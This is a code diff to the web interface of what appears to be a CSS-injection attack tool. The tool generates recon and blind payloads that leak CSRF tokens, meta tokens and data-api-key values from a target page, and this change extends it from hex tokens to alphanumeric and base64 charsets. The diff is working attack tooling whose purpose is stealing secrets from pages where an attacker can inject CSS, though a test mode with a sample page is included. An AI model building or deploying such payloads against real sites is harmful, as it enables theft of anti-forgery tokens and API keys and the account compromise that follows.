@@ -153,8 +153,8 @@
   .field-row { display: flex; gap: 12px; align-items: center; font-size: 13px; padding: 4px 0; border-bottom: 1px solid #1a1a1a; }
   .field-row .name { color: #e0e0e0; flex: 1; word-break: break-all; }
   .badge { font-size: 10px; text-transform: uppercase; letter-spacing: 1px; padding: 1px 6px; border-radius: 3px; border: 1px solid #333; color: #555; }
-  .badge.hex { color: #00ff41; border-color: #00ff41; }
   .badge.nohex { color: #ff5555; border-color: #ff5555; }
+  .field-row select.config-input { flex: none; width: 130px; padding: 1px 24px 1px 6px; font-size: 11px; }
   .result { margin-bottom: 10px; }
   .result .label { font-size: 11px; color: #555; text-transform: uppercase; letter-spacing: 1px; }
   .note { font-size: 12px; color: #555; margin-top: 8px; }
@@ -209,6 +209,15 @@
       <input type="number" id="cfgLength" class="config-input short" min="1">
     </div>
     <div class="config-row">
+      <span class="config-label">charset</span>
+      <select id="cfgCharset" class="config-input">
+        <option value="hex">hex (0-9a-f)</option>
+        <option value="alnum">alphanumeric (A-Za-z0-9)</option>
+        <option value="base64">base64 (A-Za-z0-9+/=)</option>
+        <option value="base64url">base64url (A-Za-z0-9-_)</option>
+      </select>
+    </div>
+    <div class="config-row">
       <span class="config-label">window</span>
       <select id="cfgWindow" class="config-input">
         <option value="4">4 chars &mdash; ~99% single guess at 40 chars, ~4 MB CSS</option>
@@ -260,16 +269,17 @@
       <button class="btn" id="reconCopyBtn">copy recon payload</button>
       <span class="status" id="reconCopyStatus"></span>
     </div>
-    <div class="note">Wordlist probes for field names, which element can host the requests, and whether each value is lowercase hex. Inject it, then pick fields below.</div>
+    <div class="note">Wordlist probes for field names, which element can host the requests, and which charset each value looks like. Inject it, then pick fields (and their charsets) below.</div>
   </div>
 
   <div class="panel blind-only hidden-mode">
     <div class="panel-header"><span class="indicator" id="reconDot"></span>2. discovered fields</div>
     <div id="fieldList" class="token-box muted">waiting for recon...</div>
+    <div class="note">Non-hex fields always use 3-char windows plus case pairs (~4–5 MB/field).</div>
     <div style="margin-top:12px" class="actions">
       <select id="blindWindow" class="config-input" style="flex:none;width:300px">
-        <option value="4">4 chars &mdash; accurate, ~5 MB/field</option>
-        <option value="3">3 chars &mdash; ~0.3–0.4 MB/field, candidates</option>
+        <option value="4">hex: 4 chars &mdash; accurate, ~5 MB/field</option>
+        <option value="3">hex: 3 chars &mdash; ~0.3–0.4 MB/field, candidates</option>
       </select>
       <select id="blindCopyMode" class="config-input" style="flex:none;width:220px">
         <option value="test">Copy as HTML for test</option>
@@ -313,6 +323,8 @@
 <script src="/blind.js"></script>
 <script>
 let CONFIG = null;
+const escapeHtml = s => String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]);
+const CASE_NOTE = '<div class="note">letter case could not be recovered; shown in lowercase</div>';
 // The most recent applyConfig() round-trip. Config now applies automatically
 // on every field change, so copy/generate must wait for an in-flight apply to
 // land before reading CONFIG, or they'd build a payload from the old config.
@@ -332,6 +344,7 @@ const PRESETS = {
     endSelector: '&operation=login',
     tokenLength: 40,
     windowSize: 4,
+    charset: 'hex',
   },
   hidden: {
     selector: 'input[type="hidden"][name="csrf"]',
@@ -341,9 +354,24 @@ const PRESETS = {
     endSelector: '',
     tokenLength: 40,
     windowSize: 4,
+    charset: 'hex',
     hostMode: 'sibling',
   },
 };
+
+// Non-hex charsets only offer 3-char windows (4-char ones would need
+// millions of rules), and their 3-char payload is ~3-4 MB.
+const WINDOW_LABELS = {
+  hex: '3 chars &mdash; ~260–280 KB CSS, longer tokens may give candidates',
+  other: '3 chars + case pairs &mdash; ~3.2–4.0 MB CSS',
+};
+function updateWindowOptions() {
+  const hex = document.getElementById('cfgCharset').value === 'hex';
+  const win = document.getElementById('cfgWindow');
+  win.querySelector('option[value="4"]').disabled = !hex;
+  win.querySelector('option[value="3"]').innerHTML = WINDOW_LABELS[hex ? 'hex' : 'other'];
+  if (!hex) win.value = '3';
+}
 
 async function copyAsHtml(html) {
   const blob = new Blob([html], { type: 'text/html' });
@@ -365,9 +393,11 @@ function loadPreset(type) {
   document.getElementById('cfgStart').value = preset.startSelector;
   document.getElementById('cfgEnd').value = preset.endSelector;
   document.getElementById('cfgLength').value = preset.tokenLength;
+  document.getElementById('cfgCharset').value = preset.charset || 'hex';
   document.getElementById('cfgWindow').value = preset.windowSize;
   document.getElementById('cfgHost').value = preset.hostMode || 'sibling';
   updateHostRow();
+  updateWindowOptions();
 }
 
 function applyConfig() {
@@ -379,6 +409,7 @@ function applyConfig() {
     endSelector: document.getElementById('cfgEnd').value,
     tokenLength: parseInt(document.getElementById('cfgLength').value, 10) || 40,
     windowSize: parseInt(document.getElementById('cfgWindow').value, 10),
+    charset: document.getElementById('cfgCharset').value,
     hostMode: document.getElementById('cfgHost').value,
   };
 
@@ -427,10 +458,11 @@ async function checkToken() {
     if (data.status === 'ok') {
       if (data.candidates) {
         el.innerHTML = '<span style="color:#ff0">ambiguous (' + data.candidates.length + (data.truncated ? '+' : '') + ' candidates):</span><br>' +
-          data.candidates.map(c => '<span style="color:#00ff41">' + c + '</span>').join('<br>');
+          data.candidates.map(c => '<span style="color:#00ff41">' + escapeHtml(c) + '</span>').join('<br>');
       } else {
         el.textContent = data.token;
       }
+      if (data.caseUnresolved) el.insertAdjacentHTML('beforeend', CASE_NOTE);
       el.classList.remove('muted');
       dot.className = 'indicator done';
     } else if (data.status === 'partial') {
@@ -456,6 +488,8 @@ async function init() {
   document.getElementById('cfgAttr').value = CONFIG.attribute;
   document.getElementById('cfgToken').value = CONFIG.tokenName;
   document.getElementById('cfgLength').value = CONFIG.tokenLength || 40;
+  document.getElementById('cfgCharset').value = CONFIG.charset || 'hex';
+  updateWindowOptions();
   document.getElementById('cfgWindow').value = CONFIG.windowSize;
   if (CONFIG.tag === 'input') {
     document.getElementById('cfgType').value = 'hidden';
@@ -485,6 +519,12 @@ async function init() {
   // Changing the type swaps in that preset, then applies it.
   document.getElementById('cfgType').addEventListener('change', (e) => {
     loadPreset(e.target.value);
+    applyConfig();
+  });
+
+  // A non-hex charset forces 3-char windows before applying.
+  document.getElementById('cfgCharset').addEventListener('change', () => {
+    updateWindowOptions();
     applyConfig();
   });
 
@@ -534,13 +574,18 @@ async function init() {
 let MODE = 'targeted';
 let BLIND_FIELDS = [];
 
-const escapeHtml = s => String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c]);
 const randomHex = n => Array.from(crypto.getRandomValues(new Uint8Array(Math.ceil(n / 2))), b => b.toString(16).padStart(2, '0')).join('').slice(0, n);
+// Random chars from a charset's full alphabet (base64 padding left out).
+const randomChars = (charset, n) => {
+  const alphabet = alphabetOf(CHARSETS[charset]).replace('=', '');
+  return Array.from(crypto.getRandomValues(new Uint8Array(n)), b => alphabet[b % alphabet.length]).join('');
+};
+const CHARSET_LABELS = { hex: 'hex', alnum: 'alphanumeric', base64: 'base64', base64url: 'base64url' };
 
-// A page with one field of each kind recon looks for, so both stages can be
-// tried in the test area.
+// A page with one field of each kind recon looks for, each in a different
+// charset, so both stages can be tried in the test area.
 function makeBlindSample() {
-  const t = { csrf: randomHex(40), meta: randomHex(32), code: randomHex(24), data: randomHex(32) };
+  const t = { csrf: randomChars('alnum', 40), meta: randomChars('base64', 32), code: randomHex(24), data: randomChars('base64url', 32) };
   const html =
     `<meta name="csrf-token" content="${t.meta}">` +
     `<form action="/login"><input type="hidden" name="csrf_token" value="${t.csrf}">` +
@@ -550,7 +595,8 @@ function makeBlindSample() {
   return {
     tokens: t,
     html,
-    text: `csrf_token: ${t.csrf}\nmeta csrf-token: ${t.meta}\na ?code=: ${t.code}\ndata-api-key: ${t.data}`,
+    text: `csrf_token (alphanumeric): ${t.csrf}\nmeta csrf-token (base64): ${t.meta}\n` +
+      `a ?code= (hex): ${t.code}\ndata-api-key (base64url): ${t.data}`,
   };
 }
 let BLIND_SAMPLE = makeBlindSample();
@@ -605,10 +651,16 @@ function renderFields(data) {
     return;
   }
   const label = { input: 'input', meta: 'meta', a: 'a href param', form: 'form action param', data: 'data attr' };
+  // Recon's charset (or hex for URL params, whose values aren't probed) is
+  // preselected; a value that fits no charset is shown but left unticked.
   box.innerHTML = data.fields.map((f, i) => {
-    const hex = f.hex === true ? '<span class="badge hex">hex</span>' : f.hex === false ? '<span class="badge nohex">not hex</span>' : '<span class="badge">hex?</span>';
-    return `<div class="field-row"><label><input type="checkbox" class="field-pick" data-i="${i}" ${f.hex === false ? '' : 'checked'}></label>` +
-      `<span class="name">${escapeHtml(f.name)}</span><span class="badge">${label[f.kind]}</span><span class="badge">host: ${f.host}</span>${hex}</div>`;
+    const pick = f.charset || 'hex';
+    const options = Object.entries(CHARSET_LABELS)
+      .map(([v, l]) => `<option value="${v}"${v === pick ? ' selected' : ''}>${l}${f.charset === null && v === 'hex' ? '?' : ''}</option>`).join('');
+    const unknown = f.charset === false ? '<span class="badge nohex">no charset</span>' : '';
+    return `<div class="field-row"><label><input type="checkbox" class="field-pick" data-i="${i}" ${f.charset === false ? '' : 'checked'}></label>` +
+      `<span class="name">${escapeHtml(f.name)}</span><span class="badge">${label[f.kind]}</span><span class="badge">host: ${f.host}</span>${unknown}` +
+      `<select class="config-input field-charset" data-i="${i}">${options}</select></div>`;
   }).join('') + (data.unlistedInputs ? '<div class="note">there are also hidden inputs with names not in the wordlist</div>' : '');
 }
 
@@ -641,10 +693,12 @@ function renderResults(data) {
     } else if (r.status === 'ok') {
       body = escapeHtml(r.token);
     } else if (r.status === 'failed') {
-      body = '<span style="color:#ff5555">no hex token recovered (value may not be pure lowercase hex)</span>';
+      const name = CHARSET_LABELS[r.charset] || 'hex';
+      body = `<span style="color:#ff5555">no ${name} token recovered (value may not be purely ${name})</span>`;
     } else {
       body = '<span style="color:#555">no requests for this field</span>';
     }
+    if (r.status === 'ok' && r.caseUnresolved) body += CASE_NOTE;
     return `<div class="result"><div class="label">${escapeHtml(r.kind)} ${escapeHtml(r.name)}</div>${body}</div>`;
   }).join('');
 }
@@ -673,7 +727,10 @@ function initBlind() {
   document.getElementById('blindCopyBtn').addEventListener('click', async () => {
     const status = document.getElementById('blindCopyStatus');
     const windowSize = parseInt(document.getElementById('blindWindow').value, 10);
-    const picked = [...document.querySelectorAll('.field-pick:checked')].map(e => BLIND_FIELDS[e.dataset.i]);
+    const picked = [...document.querySelectorAll('.field-pick:checked')].map(e => ({
+      ...BLIND_FIELDS[e.dataset.i],
+      charset: document.querySelector(`.field-charset[data-i="${e.dataset.i}"]`).value,
+    }));
     if (!picked.length) {
       status.textContent = 'pick at least one field';
       status.className = 'status';
